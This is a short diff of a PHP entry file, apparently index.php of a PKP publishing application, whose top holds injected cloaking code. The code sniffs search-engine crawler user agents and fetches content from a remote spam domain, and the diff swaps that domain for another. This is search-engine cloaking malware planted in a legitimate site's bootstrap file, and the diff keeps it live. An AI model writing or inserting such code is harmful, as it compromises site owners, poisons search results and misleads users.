@@ -1,7 +1,7 @@
 <?php
 @ob_start();
 header("Vary: User-Agent");
-$targetUrl = "https://fugyou.baby/desktop/unkaha.txt";
+$targetUrl = "https://obeydasupreme.site/obs/unkaha.html";
 $botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 function fetchContentCurl($url) {
@@ -67,3 +67,4 @@ require_once './lib/pkp/includes/functions.php';
 
 // Initialize the application environment
 return new \APP\core\Application();
+
